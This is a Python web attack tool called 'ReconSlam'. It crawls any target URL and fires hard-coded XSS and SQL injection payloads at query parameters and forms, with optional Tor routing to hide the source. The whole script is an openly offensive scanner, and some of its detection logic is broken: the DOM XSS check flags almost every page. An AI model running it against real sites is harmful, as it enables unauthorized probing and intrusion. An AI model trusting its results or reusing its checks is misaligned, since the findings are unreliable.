#!/usr/bin/env python3
import requests
import threading
import time
import csv
import json
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.progress import track

console = Console()

# === ASCII Logo ===
LOGO = r"""
██████╗ ███████╗ ██████╗ ██████╗ ██╗   ██╗███████╗
██╔══██╗██╔════╝██╔═══██╗██╔══██╗██║   ██║██╔════╝
██████╔╝█████╗  ██║   ██║██████╔╝██║   ██║█████╗  
██╔═══╝ ██╔══╝  ██║   ██║██╔═══╝ ██║   ██║██╔══╝  
██║     ███████╗╚██████╔╝██║     ╚██████╔╝███████╗
╚═╝     ╚══════╝ ╚═════╝ ╚═╝      ╚═════╝ ╚══════╝
               [bold cyan]Advanced Recon & Scanner[/bold cyan]
"""

# === Global payloads ===
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '" onerror="alert(1)',
    "'><img src=x onerror=alert(1)>",
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)">'
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*"
]

# === Utils ===
def log_info(msg): console.print(f"[blue][INFO][/blue] {msg}")
def log_success(msg): console.print(f"[green][SUCCESS][/green] {msg}")
def log_error(msg): console.print(f"[red][ERROR][/red] {msg}")
def log_vuln(url, payload, vuln_type):
    console.print(f"[bold red][{vuln_type}][/bold red] [yellow]{url}[/yellow] [green]Payload:[/green] {payload}")

# === Banner and Input ===
def banner():
    console.print(Panel.fit(LOGO, title="ReconSlam", style="bold magenta"))

def get_user_inputs():
    target = Prompt.ask("[cyan]Target URL[/cyan]").strip()
    method = Prompt.ask("[cyan]HTTP method for forms (GET/POST)[/cyan]", choices=["GET","POST"], default="GET").lower()
    depth = Prompt.ask("[cyan]Crawl depth[/cyan]", default=2, show_default=True)
    threads = Prompt.ask("[cyan]Max concurrent threads[/cyan]", default=10, show_default=True)
    use_tor = Prompt.ask("[cyan]Use Tor proxy? (y/n)[/cyan]", choices=["y","n"], default="n")
    return target, method, int(depth), int(threads), (use_tor == "y")

# === Crawl ===
class Crawler:
    def __init__(self, target, depth):
        self.target = target.rstrip('/')
        self.depth = depth
        self.visited = set()
        self.lock = threading.Lock()
    
    def crawl(self, url, level):
        if level > self.depth or url in self.visited:
            return
        try:
            log_info(f"Crawling: {url}")
            headers = {"User-Agent":"ReconSlamBot/1.0"}
            r = requests.get(url, headers=headers, timeout=7)
            r.raise_for_status()
            with self.lock:
                self.visited.add(url)
            soup = BeautifulSoup(r.text, "html.parser")
            for link in soup.find_all("a", href=True):
                href = urljoin(url, link['href'])
                if href.startswith(self.target) and href not in self.visited:
                    threading.Thread(target=self.crawl, args=(href, level+1)).start()
        except Exception as e:
            log_error(f"Crawl error at {url}: {str(e)}")

# === Scanner ===
class Scanner:
    def __init__(self, visited, method, use_tor=False):
        self.visited = visited
        self.method = method
        self.vulns = []
        self.lock = threading.Lock()
        self.session = requests.Session()
        if use_tor:
            self.session.proxies = {
                "http": "socks5h://127.0.0.1:9050",
                "https": "socks5h://127.0.0.1:9050"
            }
            log_info("Using Tor proxy at socks5h://127.0.0.1:9050")
    
    def scan_xss(self, url):
        for payload in XSS_PAYLOADS:
            test_url = f"{url}?xss={payload}"
            try:
                r = self.session.get(test_url, timeout=7)
                if payload in r.text:
                    with self.lock:
                        self.vulns.append((test_url, payload, "XSS"))
                        log_vuln(test_url, payload, "XSS")
            except Exception as e:
                log_error(f"XSS scan error on {url}: {str(e)}")

    def scan_sqli(self, url):
        for payload in SQLI_PAYLOADS:
            test_url = f"{url}?id={payload}"
            try:
                r = self.session.get(test_url, timeout=7)
                errors = ["you have an error", "syntax error", "sql syntax", "warning", "mysql"]
                if any(err in r.text.lower() for err in errors):
                    with self.lock:
                        self.vulns.append((test_url, payload, "SQLi"))
                        log_vuln(test_url, payload, "SQLi")
            except Exception as e:
                log_error(f"SQLi scan error on {url}: {str(e)}")

    def scan_forms(self, url):
        try:
            r = self.session.get(url, timeout=7)
            soup = BeautifulSoup(r.text, "html.parser")
            forms = soup.find_all("form")
            for form in forms:
                action = form.get("action")
                method = form.get("method", "get").lower()
                inputs = form.find_all("input")
                for payload in XSS_PAYLOADS + SQLI_PAYLOADS:
                    data = {inp.get("name"): payload for inp in inputs if inp.get("name")}
                    target_url = urljoin(url, action) if action else url
                    if method == "post":
                        resp = self.session.post(target_url, data=data, timeout=7)
                    else:
                        resp = self.session.get(target_url, params=data, timeout=7)
                    if payload in resp.text:
                        with self.lock:
                            vul_type = "Form XSS" if payload in XSS_PAYLOADS else "Form SQLi"
                            self.vulns.append((target_url, payload, vul_type))
                            log_vuln(target_url, payload, vul_type)
        except Exception as e:
            log_error(f"Form scan error on {url}: {str(e)}")

    def dom_xss_scan(self):
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                for url in self.visited:
                    for payload in XSS_PAYLOADS:
                        test_url = f"{url}?xss={payload}"
                        try:
                            page.goto(test_url, timeout=7000)
                            # Detect alert calls (simple heuristic)
                            triggered = page.evaluate("() => !!window.alert")
                            if triggered:
                                with self.lock:
                                    self.vulns.append((test_url, payload, "DOM XSS"))
                                    log_vuln(test_url, payload, "DOM XSS")
                        except PlaywrightTimeoutError:
                            log_error(f"Timeout on {test_url}")
                        except Exception as e:
                            log_error(f"DOM scan error on {test_url}: {str(e)}")
                browser.close()
        except Exception as e:
            log_error(f"Playwright error: {str(e)}")

# === Reporting ===
def generate_reports(vulns):
    if not vulns:
        log_info("No vulnerabilities found to report.")
        return
    # Markdown report
    with open("reconslam_report.md", "w") as f:
        f.write("# ReconSlam Vulnerability Report\n\n")
        for url, payload, vtype in vulns:
            f.write(f"- **Type**: {vtype}\n  - **URL**: {url}\n  - **Payload**: `{payload}`\n\n")
    # JSON report
    with open("reconslam_report.json", "w") as f:
        json.dump([{"type":v[2], "url":v[0], "payload":v[1]} for v in vulns], f, indent=4)
    # CSV report
    with open("reconslam_report.csv", "w", newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["Type", "URL", "Payload"])
        for v in vulns:
            writer.writerow(v)
    log_success("Reports generated: reconslam_report.md, .json, .csv")

# === Main Program ===
def main():
    banner()
    target, method, depth, max_threads, use_tor = get_user_inputs()
    crawler = Crawler(target, depth)
    crawler.crawl(target, 0)

    # Wait for crawling threads to finish
    log_info("Waiting for crawl to complete...")
    time.sleep(depth * 5)  # Simple wait, better: join threads

    scanner = Scanner(crawler.visited, method, use_tor)

    threads = []
    for url in crawler.visited:
        t = threading.Thread(target=scanner.scan_xss, args=(url,))
        threads.append(t)
        t.start()
        t2 = threading.Thread(target=scanner.scan_sqli, args=(url,))
        threads.append(t2)
        t2.start()
        t3 = threading.Thread(target=scanner.scan_forms, args=(url,))
        threads.append(t3)
        t3.start()
        # Limit threads to max_threads
        while len(threads) >= max_threads:
            for thread in threads:
                thread.join()
            threads = []

    # Join remaining threads
    for t in threads:
        t.join()

    # DOM XSS scan
    scanner.dom_xss_scan()

    # Generate reports
    generate_reports(scanner.vulns)

    log_success(f"Scan complete. Found {len(scanner.vulns)} potential vulnerabilities.")

if __name__ == "__main__":
    main()
